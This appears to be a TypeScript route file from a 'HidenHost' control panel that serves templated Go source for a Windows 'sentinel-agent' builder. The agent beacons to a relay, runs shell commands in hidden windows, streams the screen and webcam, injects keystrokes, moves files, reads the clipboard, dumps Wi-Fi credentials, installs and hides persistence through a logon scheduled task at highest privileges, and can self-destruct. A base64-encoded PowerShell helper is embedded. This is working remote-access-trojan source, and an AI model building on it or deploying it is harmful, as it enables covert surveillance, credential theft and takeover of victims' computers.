import { createFileRoute } from '@tanstack/react-router'

// ─────────────────────────────────────────────────────────────────────────────
// Go agent stub served to the build server (stdlib-only, Windows target).
//
// The agent connects to the HidenHost WebSocket relay as role=agent and
// handles commands pushed from the Control page in realtime:
//   • `cmd` { action:"shell.exec", id, cmd, timeout_ms } → runs cmd.exe /C
//   • `cmd` { action:"system.info", id }                 → replies with info
//   • `cmd` { action:"ping", id }                        → ok:true
// It also pushes `metrics` every 2s so the Info tab stays live, and sends
// one `info` snapshot on connect.
//
// HTTP endpoints are only used for auto-registration and heartbeat.
// ─────────────────────────────────────────────────────────────────────────────

const bindingGo = `package main

const (
	ownerUserID    = "{{USER_ID}}"
	apiBase        = "{{API_BASE}}"
	relayURL       = "{{RELAY_URL}}"
	buildName      = "{{BUILD_NAME}}"
	startupTask    = {{FEATURE_STARTUP}}
	startupName    = "{{STARTUP_NAME}}"
	debugConsole   = {{DEBUG}}
	buildTag       = "{{BUILD_TAG}}"
	hidenAuthKey   = "{{HIDEN_AUTH_KEY}}"
	bindDeviceID   = "{{BIND_DEVICE_ID}}"
	bindDeviceTok  = "{{BIND_DEVICE_TOKEN}}"
)
`

const goMod = `module sentinel-agent

go 1.22
`

const mainGo = `package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var httpClient = &http.Client{Timeout: 30 * time.Second}

func httpJSON(method, path string, body any, out any) error {
	var r io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return err
		}
		r = bytes.NewReader(b)
	}
	req, err := http.NewRequest(method, apiBase+path, r)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Hiden-Auth", hidenAuthKey)
	req.Header.Set("User-Agent", "sentinel-go-agent/2.0 ("+buildName+")")
	resp, err := httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 400 {
		return fmt.Errorf("%s %s -> %d: %s", method, path, resp.StatusCode, string(raw))
	}
	if out != nil && len(raw) > 0 {
		return json.Unmarshal(raw, out)
	}
	return nil
}

// ─── identity ────────────────────────────────────────────────────────────────

type identity struct {
	DeviceID string ` + "`json:\"device_id\"`" + `
	Token    string ` + "`json:\"device_token\"`" + `
}

var ident identity
var startedAt = time.Now()

func pcName() string {
	n, err := os.Hostname()
	if err != nil || n == "" {
		return "unknown-pc"
	}
	return n
}

func whoami() string {
	u, err := user.Current()
	if err != nil || u == nil {
		return "unknown"
	}
	name := u.Username
	if i := strings.LastIndexAny(name, "\\\\/"); i >= 0 {
		name = name[i+1:]
	}
	return name
}

func identPath() string {
	dir, err := os.UserConfigDir()
	if err != nil || dir == "" {
		dir = os.TempDir()
	}
	p := filepath.Join(dir, "sentinel")
	_ = os.MkdirAll(p, 0o700)
	return filepath.Join(p, buildName+".json")
}

func loadIdent() bool {
	if bindDeviceID != "" && bindDeviceTok != "" {
		ident = identity{DeviceID: bindDeviceID, Token: bindDeviceTok}
		return true
	}
	raw, err := os.ReadFile(identPath())
	if err != nil {
		return false
	}
	_ = json.Unmarshal(raw, &ident)
	return ident.DeviceID != "" && ident.Token != ""
}

func saveIdent() {
	b, _ := json.Marshal(ident)
	_ = os.WriteFile(identPath(), b, 0o600)
}

func register() error {
	body := map[string]any{
		"bind_user_id": ownerUserID,
		"pc_name":      pcName(),
		"username":     whoami(),
		"os":           osLabel(),
		"platform":     "windows",
		"device_name":  buildName,
		"tag":          buildTag,
	}
	var resp struct {
		DeviceID string ` + "`json:\"device_id\"`" + `
		Token    string ` + "`json:\"device_token\"`" + `
	}
	if err := httpJSON("POST", "/api/public/agent/auto-register", body, &resp); err != nil {
		return err
	}
	if resp.DeviceID == "" || resp.Token == "" {
		return fmt.Errorf("register: empty id/token")
	}
	ident = identity{DeviceID: resp.DeviceID, Token: resp.Token}
	saveIdent()
	return nil
}

// ─── heartbeat (keeps devices.is_online fresh in DB) ─────────────────────────

func heartbeat() {
	m := currentMetrics()
	_ = httpJSON("POST", "/api/public/agent/heartbeat", map[string]any{
		"device_id":    ident.DeviceID,
		"device_token": ident.Token,
		"username":     whoami(),
		"metrics":      m,
	}, nil)
}

func heartbeatLoop() {
	heartbeat()
	t := time.NewTicker(15 * time.Second)
	defer t.Stop()
	for range t.C {
		heartbeat()
	}
}

// ─── system info / metrics ───────────────────────────────────────────────────

func osLabel() string {
	if runtime.GOOS == "windows" {
		return "Windows"
	}
	return runtime.GOOS
}

type metrics struct {
	CPUPercent    float64 ` + "`json:\"cpu_percent\"`" + `
	RAMPercent    float64 ` + "`json:\"ram_percent\"`" + `
	RAMUsedMB     int     ` + "`json:\"ram_used_mb\"`" + `
	RAMTotalMB    int     ` + "`json:\"ram_total_mb\"`" + `
	UptimeSeconds int64   ` + "`json:\"uptime_seconds\"`" + `
}

func currentMetrics() metrics {
	m := metrics{UptimeSeconds: systemUptimeSeconds()}
	total, free := memStatus()
	if total > 0 {
		used := total - free
		m.RAMTotalMB = int(total / (1024 * 1024))
		m.RAMUsedMB = int(used / (1024 * 1024))
		m.RAMPercent = float64(used) / float64(total) * 100.0
	}
	m.CPUPercent = cpuPercent()
	return m
}

func sysInfo() map[string]any {
	return map[string]any{
		"pc_name":    pcName(),
		"username":   whoami(),
		"os":         osLabel(),
		"arch":       runtime.GOARCH,
		"goroutines": runtime.NumGoroutine(),
		"num_cpu":    runtime.NumCPU(),
		"agent":      "sentinel-go/2.1",
		"build":      buildName,
		"tag":        buildTag,
		"started_at": startedAt.Unix(),
	}
}

// ─── command handling ────────────────────────────────────────────────────────

type cmdMsg struct {
	ID        string ` + "`json:\"id\"`" + `
	Action    string ` + "`json:\"action\"`" + `
	Cmd       string ` + "`json:\"cmd\"`" + `
	TimeoutMs int    ` + "`json:\"timeout_ms\"`" + `
}

func handleCommand(send chan<- []byte, p map[string]any) {
	// Decode leniently so unknown extra keys are ignored.
	raw, _ := json.Marshal(p)
	var c cmdMsg
	_ = json.Unmarshal(raw, &c)
	if c.ID == "" {
		return
	}
	switch c.Action {
	case "ping":
		sendResult(send, c.ID, true, map[string]any{"pong": true}, "")
	case "system.info":
		sendResult(send, c.ID, true, sysInfo(), "")
	case "system.metrics":
		sendResult(send, c.ID, true, currentMetrics(), "")
	case "shell.exec":
		go runShell(send, c)
	case "screen.start":
		screenStart(send, c.ID, p)
	case "screen.stop":
		screenStop(send, c.ID)
	case "screen.config":
		screenConfig(send, c.ID, p)
	case "camera.list":
		go cameraList(send, c.ID)
	case "camera.start":
		cameraStart(send, c.ID, p)
	case "camera.stop":
		cameraStop(send, c.ID)
	case "camera.config":
		cameraConfig(send, c.ID, p)
	case "input.mouse":
		inputMouseCmd(send, c.ID, p)
	case "input.key":
		inputKeyCmd(send, c.ID, p)
	case "fs.list":
		go fsListCmd(send, c.ID, p)
	case "fs.download":
		go fsDownloadCmd(send, c.ID, p)
	case "fs.upload":
		go fsUploadCmd(send, c.ID, p)
	case "fs.delete":
		go fsDeleteCmd(send, c.ID, p)
	case "proc.list":
		go procListCmd(send, c.ID)
	case "proc.kill":
		go procKillCmd(send, c.ID, p)
	case "screenshot":
		go screenshotCmd(send, c.ID)
	case "camera.shot":
		go cameraShotCmd(send, c.ID, p)
	case "agent.uninstall":
		agentUninstallCmd(send, c.ID)
	case "session.lock":
		go sessionCmd(send, c.ID, "lock")
	case "session.logoff":
		go sessionCmd(send, c.ID, "logoff")
	case "session.reboot":
		go sessionCmd(send, c.ID, "reboot")
	case "session.shutdown":
		go sessionCmd(send, c.ID, "shutdown")
	case "session.sleep":
		go sessionCmd(send, c.ID, "sleep")
	case "clipboard.get":
		go clipboardGetCmd(send, c.ID)
	case "clipboard.set":
		go clipboardSetCmd(send, c.ID, p)
	case "net.interfaces":
		go netInterfacesCmd(send, c.ID)
	case "net.connections":
		go netConnectionsCmd(send, c.ID)
	case "net.publicip":
		go netPublicIPCmd(send, c.ID)
	case "audio.devices":
		go audioDevicesCmd(send, c.ID)
	case "activity.idle":
		go activityIdleCmd(send, c.ID)
	case "activity.windows":
		go activityWindowsCmd(send, c.ID)
	case "persist.status":
		go persistStatusCmd(send, c.ID)
	case "persist.install":
		go persistInstallCmd(send, c.ID)
	case "persist.remove":
		go persistRemoveCmd(send, c.ID)
	case "persist.hide":
		go persistHideCmd(send, c.ID)
	case "agent.update":
		go agentUpdateCmd(send, c.ID)
	case "agent.selfdestruct":
		go agentSelfDestructCmd(send, c.ID)
	case "svc.list":
		go svcListCmd(send, c.ID)
	case "svc.start":
		go svcActionCmd(send, c.ID, p, "start")
	case "svc.stop":
		go svcActionCmd(send, c.ID, p, "stop")
	case "reg.list":
		go regListCmd(send, c.ID, p)
	case "reg.set":
		go regSetCmd(send, c.ID, p)
	case "reg.delete":
		go regDeleteCmd(send, c.ID, p)
	case "display.list":
		go displayListCmd(send, c.ID)
	case "creds.wifi":
		go credsWifiCmd(send, c.ID)
	default:
		sendResult(send, c.ID, false, nil, "not_supported: "+c.Action)
	}
}

func runShell(send chan<- []byte, c cmdMsg) {
	if strings.TrimSpace(c.Cmd) == "" {
		sendResult(send, c.ID, false, nil, "empty command")
		return
	}
	timeoutMs := c.TimeoutMs
	if timeoutMs <= 0 || timeoutMs > 120000 {
		timeoutMs = 25000
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutMs)*time.Millisecond)
	defer cancel()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", c.Cmd)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", c.Cmd)
	}
	hideWindow(cmd)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	exitCode := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		} else {
			exitCode = -1
		}
	}
	result := map[string]any{
		"stdout":    truncate(stdout.String(), 200_000),
		"stderr":    truncate(stderr.String(), 200_000),
		"exit_code": exitCode,
	}
	ok := true
	errMsg := ""
	if ctx.Err() == context.DeadlineExceeded {
		ok = false
		errMsg = "timeout"
	}
	sendResult(send, c.ID, ok, result, errMsg)
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n] + "\\n…[truncated]"
	}
	return s
}

func sendResult(send chan<- []byte, id string, ok bool, result any, errMsg string) {
	payload := map[string]any{"id": id, "ok": ok}
	if result != nil {
		payload["result"] = result
	}
	if errMsg != "" {
		payload["error"] = errMsg
	}
	msg := map[string]any{"type": "result", "payload": payload}
	b, _ := json.Marshal(msg)
	select {
	case send <- b:
	default:
	}
}

// ─── metrics push loop ───────────────────────────────────────────────────────

func metricsLoop(ctx context.Context, send chan<- []byte) {
	t := time.NewTicker(2 * time.Second)
	defer t.Stop()
	// one info snapshot up front
	b, _ := json.Marshal(map[string]any{"type": "info", "payload": sysInfo()})
	select {
	case send <- b:
	default:
	}
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			mb, _ := json.Marshal(map[string]any{"type": "metrics", "payload": currentMetrics()})
			select {
			case send <- mb:
			default:
			}
		}
	}
}

// ─── WebSocket relay loop ────────────────────────────────────────────────────

var mu sync.Mutex

func wsRun() error {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	defer screenHardStop()

	send := make(chan []byte, 64)
	ws, err := wsDial(relayURL, map[string]string{
		"role":     "agent",
		"device":   ident.DeviceID,
		"clientId": "agent-" + ident.DeviceID,
		"key":      hidenAuthKey,
	})
	if err != nil {
		return err
	}
	defer ws.Close()
	logf("relay connected: %s", relayURL)

	// hello
	hello, _ := json.Marshal(map[string]any{
		"type":     "hello",
		"role":     "agent",
		"deviceId": ident.DeviceID,
	})
	if err := ws.WriteText(hello); err != nil {
		return err
	}

	go metricsLoop(ctx, send)

	// writer
	go func() {
		pinger := time.NewTicker(20 * time.Second)
		defer pinger.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case msg := <-send:
				mu.Lock()
				err := ws.WriteText(msg)
				mu.Unlock()
				if err != nil {
					cancel()
					return
				}
			case <-pinger.C:
				b, _ := json.Marshal(map[string]any{"type": "ping", "t": time.Now().UnixMilli()})
				mu.Lock()
				err := ws.WriteText(b)
				mu.Unlock()
				if err != nil {
					cancel()
					return
				}
			}
		}
	}()

	// reader
	for {
		op, data, err := ws.ReadMessage()
		if err != nil {
			return err
		}
		if op != 1 { // only text frames
			continue
		}
		var env struct {
			Type    string                 ` + "`json:\"type\"`" + `
			Payload map[string]any         ` + "`json:\"payload\"`" + `
		}
		if json.Unmarshal(data, &env) != nil {
			continue
		}
		switch env.Type {
		case "pong", "welcome", "viewer-joined", "viewer-left":
			// ignore
		case "cmd":
			handleCommand(send, env.Payload)
		}
	}
}

// ─── main ────────────────────────────────────────────────────────────────────

func logf(format string, args ...any) {
	if debugConsole {
		fmt.Printf("["+time.Now().Format("15:04:05")+"] "+format+"\\n", args...)
	}
}

func installStartup() {
	if !startupTask || runtime.GOOS != "windows" {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	name := startupName
	if name == "" {
		name = buildName
	}
	_ = exec.Command("schtasks", "/Create", "/F", "/SC", "ONLOGON",
		"/RL", "HIGHEST", "/TN", name, "/TR", exe).Run()
}

// singleInstance ensures only one copy of this build runs per PC using a
// Windows named mutex. On non-Windows it is a no-op.
func singleInstance() {
	if runtime.GOOS != "windows" {
		return
	}
	kernel32m := syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex := kernel32m.NewProc("CreateMutexW")
	name, _ := syscall.UTF16PtrFromString("Global\\\\" + buildName)
	_, _, err := procCreateMutex.Call(0, 0, uintptr(unsafe.Pointer(name)))
	if errno, ok := err.(syscall.Errno); ok && errno == 183 { // ERROR_ALREADY_EXISTS
		os.Exit(0)
	}
}

func main() {
	singleInstance()
	installStartup()
	logf("sentinel-go/2.1 starting build=%s tag=%s", buildName, buildTag)
	if !loadIdent() {
		for i := 0; i < 20; i++ {
			if err := register(); err == nil {
				break
			}
			logf("register failed, retry in 5s")
			time.Sleep(5 * time.Second)
		}
	}
	logf("agent online device=%s", ident.DeviceID)
	go heartbeatLoop()
	// reconnect forever
	backoff := 2 * time.Second
	for {
		if err := wsRun(); err != nil {
			logf("relay error: %v", err)
		}
		time.Sleep(backoff)
		if backoff < 30*time.Second {
			backoff += 2 * time.Second
		}
	}
}
`

// ───────────────────────────────────────────────────────────────────────────── 
// Minimal stdlib WebSocket client (RFC 6455).  Enough for our relay:
//  • wss:// via crypto/tls
//  • text + ping/pong + close frames
//  • masked client-to-server frames (unmasked server-to-client)
// ─────────────────────────────────────────────────────────────────────────────

const wsGo = `package main

import (
	"bufio"
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type wsConn struct {
	conn net.Conn
	br   *bufio.Reader
}

func (w *wsConn) Close() error { return w.conn.Close() }

func wsDial(rawURL string, qs map[string]string) (*wsConn, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}
	tlsOn := u.Scheme == "wss"
	host := u.Host
	if !strings.Contains(host, ":") {
		if tlsOn {
			host += ":443"
		} else {
			host += ":80"
		}
	}
	q := u.Query()
	for k, v := range qs {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()

	d := &net.Dialer{Timeout: 15 * time.Second}
	var conn net.Conn
	if tlsOn {
		conn, err = tls.DialWithDialer(d, "tcp", host, &tls.Config{ServerName: u.Hostname()})
	} else {
		conn, err = d.Dial("tcp", host)
	}
	if err != nil {
		return nil, err
	}

	keyBytes := make([]byte, 16)
	_, _ = rand.Read(keyBytes)
	key := base64.StdEncoding.EncodeToString(keyBytes)

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}

	req := "GET " + path + " HTTP/1.1\\r\\n" +
		"Host: " + u.Host + "\\r\\n" +
		"Upgrade: websocket\\r\\n" +
		"Connection: Upgrade\\r\\n" +
		"Sec-WebSocket-Key: " + key + "\\r\\n" +
		"Sec-WebSocket-Version: 13\\r\\n" +
		"User-Agent: sentinel-go-ws/1.0\\r\\n\\r\\n"
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}
	br := bufio.NewReader(conn)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		conn.Close()
		return nil, err
	}
	resp.Body.Close()
	if resp.StatusCode != 101 {
		conn.Close()
		return nil, fmt.Errorf("ws handshake: HTTP %d", resp.StatusCode)
	}
	expect := wsAccept(key)
	if resp.Header.Get("Sec-WebSocket-Accept") != expect {
		conn.Close()
		return nil, errors.New("ws handshake: bad accept")
	}
	return &wsConn{conn: conn, br: br}, nil
}

func wsAccept(key string) string {
	h := sha1.New()
	h.Write([]byte(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

func (w *wsConn) WriteText(p []byte) error { return w.writeFrame(0x1, p) }

func (w *wsConn) writeFrame(opcode byte, payload []byte) error {
	// FIN=1 + opcode
	hdr := []byte{0x80 | (opcode & 0x0F)}
	n := len(payload)
	if n < 126 {
		hdr = append(hdr, 0x80|byte(n))
	} else if n <= 0xFFFF {
		hdr = append(hdr, 0x80|126, 0, 0)
		binary.BigEndian.PutUint16(hdr[len(hdr)-2:], uint16(n))
	} else {
		hdr = append(hdr, 0x80|127, 0, 0, 0, 0, 0, 0, 0, 0)
		binary.BigEndian.PutUint64(hdr[len(hdr)-8:], uint64(n))
	}
	mask := make([]byte, 4)
	_, _ = rand.Read(mask)
	hdr = append(hdr, mask...)
	masked := make([]byte, n)
	for i := 0; i < n; i++ {
		masked[i] = payload[i] ^ mask[i%4]
	}
	_ = w.conn.SetWriteDeadline(time.Now().Add(20 * time.Second))
	if _, err := w.conn.Write(hdr); err != nil {
		return err
	}
	if _, err := w.conn.Write(masked); err != nil {
		return err
	}
	return nil
}

// ReadMessage returns (opcode, payload, err). Pings are answered automatically
// and we loop until the caller gets a data frame.
func (w *wsConn) ReadMessage() (byte, []byte, error) {
	for {
		op, data, err := w.readFrame()
		if err != nil {
			return 0, nil, err
		}
		switch op {
		case 0x9: // ping
			_ = w.writeFrame(0xA, data)
		case 0xA: // pong
			// ignore
		case 0x8: // close
			_ = w.writeFrame(0x8, data)
			return 0, nil, io.EOF
		default:
			return op, data, nil
		}
	}
}

func (w *wsConn) readFrame() (byte, []byte, error) {
	_ = w.conn.SetReadDeadline(time.Now().Add(90 * time.Second))
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(w.br, hdr); err != nil {
		return 0, nil, err
	}
	opcode := hdr[0] & 0x0F
	masked := hdr[1]&0x80 != 0
	payloadLen := int64(hdr[1] & 0x7F)
	if payloadLen == 126 {
		ext := make([]byte, 2)
		if _, err := io.ReadFull(w.br, ext); err != nil {
			return 0, nil, err
		}
		payloadLen = int64(binary.BigEndian.Uint16(ext))
	} else if payloadLen == 127 {
		ext := make([]byte, 8)
		if _, err := io.ReadFull(w.br, ext); err != nil {
			return 0, nil, err
		}
		payloadLen = int64(binary.BigEndian.Uint64(ext))
	}
	var mask [4]byte
	if masked {
		if _, err := io.ReadFull(w.br, mask[:]); err != nil {
			return 0, nil, err
		}
	}
	if payloadLen < 0 || payloadLen > 32*1024*1024 {
		return 0, nil, fmt.Errorf("payload too large: %d", payloadLen)
	}
	data := make([]byte, payloadLen)
	if _, err := io.ReadFull(w.br, data); err != nil {
		return 0, nil, err
	}
	if masked {
		for i := range data {
			data[i] ^= mask[i%4]
		}
	}
	return opcode, data, nil
}
`

// ─────────────────────────────────────────────────────────────────────────────
// Windows-specific metrics (RAM via GlobalMemoryStatusEx, uptime via
// GetTickCount64, CPU% via GetSystemTimes delta).  Non-Windows build gets
// stubbed zeros.
// ─────────────────────────────────────────────────────────────────────────────

const metricsWindowsGo = `//go:build windows
package main

import (
	"os/exec"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32              = syscall.NewLazyDLL("kernel32.dll")
	procGlobalMemoryEx    = kernel32.NewProc("GlobalMemoryStatusEx")
	procGetTickCount64    = kernel32.NewProc("GetTickCount64")
	procGetSystemTimes    = kernel32.NewProc("GetSystemTimes")
)

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

func memStatus() (total, free uint64) {
	var m memoryStatusEx
	m.Length = uint32(unsafe.Sizeof(m))
	r, _, _ := procGlobalMemoryEx.Call(uintptr(unsafe.Pointer(&m)))
	if r == 0 {
		return 0, 0
	}
	return m.TotalPhys, m.AvailPhys
}

func systemUptimeSeconds() int64 {
	r, _, _ := procGetTickCount64.Call()
	return int64(r / 1000)
}

var (
	cpuMu       sync.Mutex
	lastIdle    uint64
	lastKernel  uint64
	lastUser    uint64
	lastSampled time.Time
)

func fileTimeToU64(low, high uint32) uint64 {
	return uint64(high)<<32 | uint64(low)
}

func cpuPercent() float64 {
	cpuMu.Lock()
	defer cpuMu.Unlock()
	var idle, kernel, user [2]uint32
	r, _, _ := procGetSystemTimes.Call(
		uintptr(unsafe.Pointer(&idle[0])),
		uintptr(unsafe.Pointer(&kernel[0])),
		uintptr(unsafe.Pointer(&user[0])),
	)
	if r == 0 {
		return 0
	}
	curIdle := fileTimeToU64(idle[0], idle[1])
	curKernel := fileTimeToU64(kernel[0], kernel[1])
	curUser := fileTimeToU64(user[0], user[1])
	defer func() {
		lastIdle, lastKernel, lastUser = curIdle, curKernel, curUser
		lastSampled = time.Now()
	}()
	if lastSampled.IsZero() {
		return 0
	}
	totalDelta := (curKernel - lastKernel) + (curUser - lastUser)
	idleDelta := curIdle - lastIdle
	if totalDelta == 0 {
		return 0
	}
	busy := totalDelta - idleDelta
	return float64(busy) / float64(totalDelta) * 100.0
}

func hideWindow(c *exec.Cmd) {
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
}
`

const metricsOtherGo = `//go:build !windows
package main

import "os/exec"

func memStatus() (uint64, uint64)     { return 0, 0 }
func systemUptimeSeconds() int64      { return 0 }
func cpuPercent() float64             { return 0 }
func hideWindow(_ *exec.Cmd)          {}
`

// ─────────────────────────────────────────────────────────────────────────────
// Live screen streaming + input injection (Windows only; other OS = stubs).
// ─────────────────────────────────────────────────────────────────────────────

const screenGo = `package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"image/jpeg"
	"sync"
	"time"
)

type screenState struct {
	mu      sync.Mutex
	running bool
	cancel  chan struct{}
	fps     int
	maxW    int
	quality int
}

var screen screenState

func getNum(p map[string]any, k string, def int) int {
	if v, ok := p[k]; ok {
		switch n := v.(type) {
		case float64:
			return int(n)
		case int:
			return n
		}
	}
	return def
}

func getFloat(p map[string]any, k string, def float64) float64 {
	if v, ok := p[k]; ok {
		if n, ok2 := v.(float64); ok2 {
			return n
		}
	}
	return def
}

func getStr(p map[string]any, k, def string) string {
	if v, ok := p[k]; ok {
		if s, ok2 := v.(string); ok2 {
			return s
		}
	}
	return def
}

func clampInt(v, lo, hi int) int {
	if v < lo {
		return lo
	}
	if v > hi {
		return hi
	}
	return v
}

func screenStart(send chan<- []byte, id string, p map[string]any) {
	screen.mu.Lock()
	screen.fps = clampInt(getNum(p, "fps", 10), 1, 30)
	screen.maxW = clampInt(getNum(p, "max_width", 1280), 320, 3840)
	screen.quality = clampInt(getNum(p, "quality", 55), 20, 90)
	if screen.running {
		screen.mu.Unlock()
		sendResult(send, id, true, map[string]any{"ok": true, "already": true}, "")
		return
	}
	screen.running = true
	screen.cancel = make(chan struct{})
	cancel := screen.cancel
	screen.mu.Unlock()
	go screenLoop(send, cancel)
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func screenStop(send chan<- []byte, id string) {
	screenHardStop()
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func screenHardStop() {
	screen.mu.Lock()
	if screen.running {
		screen.running = false
		close(screen.cancel)
	}
	screen.mu.Unlock()
}

func screenConfig(send chan<- []byte, id string, p map[string]any) {
	screen.mu.Lock()
	if v := getNum(p, "fps", 0); v > 0 {
		screen.fps = clampInt(v, 1, 30)
	}
	if v := getNum(p, "max_width", 0); v > 0 {
		screen.maxW = clampInt(v, 320, 3840)
	}
	if v := getNum(p, "quality", 0); v > 0 {
		screen.quality = clampInt(v, 20, 90)
	}
	screen.mu.Unlock()
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func screenLoop(send chan<- []byte, cancel chan struct{}) {
	blackCount := 0
	for {
		select {
		case <-cancel:
			return
		default:
		}
		start := time.Now()
		screen.mu.Lock()
		fps := screen.fps
		maxW := screen.maxW
		quality := screen.quality
		screen.mu.Unlock()
		if fps <= 0 {
			fps = 10
		}
		img, w, h, err := captureFrame(maxW)
		if err == nil && img != nil {
			// ── VM black-frame detection & recovery ──────────────
			if isBlackFrame(img.Pix, img.Rect.Dx(), img.Rect.Dy()) {
				blackCount++
				if blackCount == 1 {
					// First black frame: try waking the desktop and retry once
					wakeDesktop()
					time.Sleep(200 * time.Millisecond)
					img2, w2, h2, err2 := captureFrame(maxW)
					if err2 == nil && img2 != nil && !isBlackFrame(img2.Pix, img2.Rect.Dx(), img2.Rect.Dy()) {
						img, w, h = img2, w2, h2
						blackCount = 0
					}
				}
				if blackCount > 0 && blackCount%30 == 0 {
					// Every ~30 consecutive black frames, notify the UI
					errMsg, _ := json.Marshal(map[string]any{
						"type": "screen.error",
						"payload": map[string]any{
							"error": "Black screen detected — the VM may not have an active desktop session (disconnected RDP / headless). Try connecting via RDP first.",
						},
					})
					select {
					case send <- errMsg:
					default:
					}
					// Also try waking periodically
					wakeDesktop()
				}
			} else {
				blackCount = 0
			}

			var buf bytes.Buffer
			if jerr := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); jerr == nil {
				b64 := base64.StdEncoding.EncodeToString(buf.Bytes())
				msg, _ := json.Marshal(map[string]any{
					"type": "screen.frame",
					"payload": map[string]any{
						"w":     w,
						"h":     h,
						"jpeg":  b64,
						"ts":    time.Now().UnixMilli(),
						"bytes": buf.Len(),
					},
				})
				select {
				case send <- msg:
				default:
				}
			}
		}
		target := time.Second / time.Duration(fps)
		elapsed := time.Since(start)
		if elapsed < target {
			select {
			case <-cancel:
				return
			case <-time.After(target - elapsed):
			}
		}
	}
}
`

// ─────────────────────────────────────────────────────────────────────────────
// Webcam / camera streaming — Windows-only via WinRT MediaCapture, driven
// by an embedded PowerShell helper. No ffmpeg, no external install.
// ─────────────────────────────────────────────────────────────────────────────

const cameraPsListB64 = "JEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU3RvcCcKW1dpbmRvd3MuRGV2aWNlcy5FbnVtZXJhdGlvbi5EZXZpY2VJbmZvcm1hdGlvbixXaW5kb3dzLkRldmljZXMuRW51bWVyYXRpb24sQ29udGVudFR5cGU9V2luZG93c1J1bnRpbWVdIHwgT3V0LU51bGwKQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uUnVudGltZS5XaW5kb3dzUnVudGltZQokYXNUYXNrR2VuID0gW1N5c3RlbS5XaW5kb3dzUnVudGltZVN5c3RlbUV4dGVuc2lvbnNdLkdldE1ldGhvZHMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWVxICdBc1Rhc2snIC1hbmQgJF8uR2V0UGFyYW1ldGVycygpLkNvdW50IC1lcSAxIC1hbmQgJF8uR2V0UGFyYW1ldGVycygpWzBdLlBhcmFtZXRlclR5cGUuTmFtZSAtZXEgKCdJQXN5bmNPcGVyYXRpb24nICsgW2NoYXJdOTYgKyAnMScpIH0gfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiRvcCA9IFtXaW5kb3dzLkRldmljZXMuRW51bWVyYXRpb24uRGV2aWNlSW5mb3JtYXRpb25dOjpGaW5kQWxsQXN5bmMoW1dpbmRvd3MuRGV2aWNlcy5FbnVtZXJhdGlvbi5EZXZpY2VDbGFzc106OlZpZGVvQ2FwdHVyZSkKJHQgPSAkYXNUYXNrR2VuLk1ha2VHZW5lcmljTWV0aG9kKFtXaW5kb3dzLkRldmljZXMuRW51bWVyYXRpb24uRGV2aWNlSW5mb3JtYXRpb25Db2xsZWN0aW9uXSkuSW52b2tlKCRudWxsLCBAKCRvcCkpCiR0LldhaXQoKSB8IE91dC1OdWxsCiR0LlJlc3VsdCB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uTmFtZSl8JCgkXy5JZCkiIH0K"

